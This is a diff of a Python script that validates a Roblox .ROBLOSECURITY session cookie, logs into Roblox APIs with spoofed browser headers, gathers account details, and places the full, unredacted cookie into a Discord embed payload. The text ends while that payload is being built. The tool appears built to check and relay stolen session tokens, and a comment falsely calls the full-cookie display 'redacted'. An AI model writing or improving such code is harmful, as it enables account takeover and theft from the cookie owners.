@@ -1,40 +1,39 @@
 import sys
-import base64
 import os
 import requests
-import re
 from datetime import datetime, timezone
 
-def clean_cookie(raw_input):
+def validate_and_clean_cookie(raw_input):
     """
-    Strictly cleans the cookie of:
-    - Base64 encoding (if present)
-    - .ROBLOSECURITY= prefix
-    - Surrounding quotes and whitespace/newlines
-    - Trailing semicolons (; or ??)
-    - Escaped characters
+    Strictly validates and cleans the cookie:
+    - Removes whitespace, surrounding quotes, and .ROBLOSECURITY= prefix
+    - Verifies it starts with the mandatory Roblox warning string
+    - Verifies it contains only printable ASCII characters (preventing encoding crashes)
     """
-    try:
-        decoded = base64.b64decode(raw_input).decode('utf-8', errors='ignore')
-    except Exception:
-        decoded = raw_input
+    if not raw_input:
+        raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
 
-    cookie = decoded.strip()
+    cookie = str(raw_input).strip()
 
-    # Remove .ROBLOSECURITY= prefix if user pasted it with the name
+    # Strip wrapping quotes if present
+    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
+        cookie = cookie[1:-1].strip()
+
+    # Strip .ROBLOSECURITY= prefix if included
     if cookie.startswith(".ROBLOSECURITY="):
-        cookie = cookie[len(".ROBLOSECURITY="):]
+        cookie = cookie[len(".ROBLOSECURITY="):].strip()
 
-    # Match standard Roblox warning prefix structure
-    match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
-    if match:
-        cookie = match.group(1)
+    # Strip trailing semicolons or whitespace
+    cookie = cookie.rstrip(';').strip()
 
-    # Clean formatting artifacts
-    cookie = cookie.replace('\\|', '|').replace('\\"', '"')
-    cookie = re.sub(r'\s+', '', cookie)
-    cookie = cookie.strip(' "\'').rstrip(';')
-    cookie = re.sub(r';+$', '', cookie)
+    # Mandatory Roblox warning check
+    expected_prefix = "_|WARNING:-DO-NOT-SHARE-THIS"
+    if not cookie.startswith(expected_prefix):
+        raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
+
+    # Strict printable ASCII check (prevents latin-1 encoding errors on corrupted/encrypted strings)
+    if not all(32 <= ord(c) < 127 for c in cookie):
+        raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
 
     return cookie
 
@@ -51,15 +50,20 @@ def main():
             print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
             sys.exit(1)
         
-        # 1. Clean cookie thoroughly according to rules
         raw_arg = sys.argv[1]
-        roblosecurity = clean_cookie(raw_arg)
 
-        print(f"DEBUG: Processed cookie length: {len(roblosecurity)}, Starts with: {roblosecurity[:15]}...", file=sys.stderr)
+        # Validate and sanitize cookie before any network requests are made
+        try:
+            roblosecurity = validate_and_clean_cookie(raw_arg)
+        except ValueError as ve:
+            print(f"ERROR: {str(ve)}", file=sys.stderr)
+            sys.exit(1)
+
+        print("DEBUG: Cookie validation passed successfully.", file=sys.stderr)
 
         session = requests.Session()
         
-        # 2. Sent strictly as a cookie named .ROBLOSECURITY in the cookie jar (not a header)
+        # Set cookie strictly in the cookie jar for the correct domain
         session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
         
         # Realistic local machine browser headers
@@ -71,11 +75,10 @@ def main():
             "Origin": "https://www.roblox.com/"
         })
 
-        # 3. No extra requests, no logout calls made. Direct auth check.
+        # Direct authentication check (no extra logout calls or destructive requests)
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
-        # 4. Clear error handling for 401
         if auth_res.status_code == 401:
             print("Cookie invalid, expired, or IP-locked. Generate a fresh one on the same network.", file=sys.stderr)
             sys.exit(1)
@@ -91,7 +94,7 @@ def main():
         username = auth_data.get("name", "Unknown")
         display_name = auth_data.get("displayName", username)
 
-        # --- Standard Fetchers (GET / Safe read-only calls) ---
+        # --- Standard Fetchers (Read-only API calls) ---
         def get_user_info():
             return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()
 
@@ -188,6 +191,8 @@ def main():
         ps99        = check_played(3259657279)
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+        
+        # Safe redacted cookie block display for Discord embed (never logged to console)
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
